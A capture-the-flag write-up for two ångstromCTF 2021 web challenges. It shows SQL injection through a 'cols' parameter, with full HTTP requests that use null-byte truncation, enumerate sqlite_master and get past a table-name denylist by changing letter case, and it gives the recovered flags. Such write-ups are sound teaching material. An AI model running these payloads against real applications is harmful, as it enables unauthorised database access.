ångstromCTF 2021

# Sea of Quills
## 70 points · 372 solves

Come check out our [finest selection of quills](https://seaofquills.2021.chall.actf.co/)!

[app.rb](https://files.actf.co/c6131fafd681ef59ee5167822702986f813b0e3177f3f7c78f1790adaac92384/app.rb)
* * *

### Solution

After exploring the site we will understand that we can view the quills and do a search on them. But it is not yet clear what could be vulnerable. 

Let's take a loot at the source code.  

Note some things:
- sqlite3 as DBMS
- blacklist for the cols parameter
- lim and off parameters can only be integers

Obviously, we have to exploit cols parameter
But we can't specify this on the page so let's intercept the request with a burp and change it.
* * *
#### A little background: 
As I understand it, the author of the task wanted us to use routed sql injection. But I found unintended solution which I will tell about lower.
* * *
If we set the cols parameter as "*" we can get all columns from the current table. But what if we want to make a more complex query?

The first thing that came to my mind was to comment out the rest of the sql query. After some research and trying, I found the necessary payload. We need just to add a null byte at the end of requst:
```http
POST /quills HTTP/1.1
Host: seaofquills.2021.chall.actf.co
Content-Length: 40

limit=123&offset=0&cols=* from quills%00
```
Next, we will find out the names of the table:
```http
POST /quills HTTP/1.1
Host: seaofquills.2021.chall.actf.co
Content-Length: 54

limit=123&offset=0&cols=tbl_name from sqlite_master%00
```
And will get the flag from **flagtable**:
```http
POST /quills HTTP/1.1
Host: seaofquills.2021.chall.actf.co
Content-Length: 43

limit=123&offset=0&cols=* from flagtable%00
```
  
Flag: `actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df}`

***  

# Sea of Quills 2
## 160 points · 143 solves

A little bird told me my original quills store was vulnerable to illegal hacking! I've fixed [my store now](https://seaofquills-two.2021.chall.actf.co/) though, and now it should be impossible to hack!

[Source](https://files.actf.co/990a2a395969dc5a5e6b9db4bd49b33af90ca0b0056b9a1a3bd2ab38ff4dd56b/app.rb)
* * *

### Solution

The task was almost the same as the previous one. But there were some changes:
- the "flag" value was added to the blacklist
- value of cols paramater must be below 25

Sqlite3 is not case-sensetive by default so using a payload with a null byte from first part of the task I checked the following request:
```http
POST /quills HTTP/1.1
Host: seaofquills-two.2021.chall.actf.co
Content-Length: 43

limit=123&offset=0&cols=* from FlaGTabLe%00
```
I just replaced some characters of the **flagtable** name with a different case and it worked!
 
Flag: `actf{the_time_we_have_spent_together_riding_through_this_english_denylist_c0776ee734497ca81cbd55ea}`
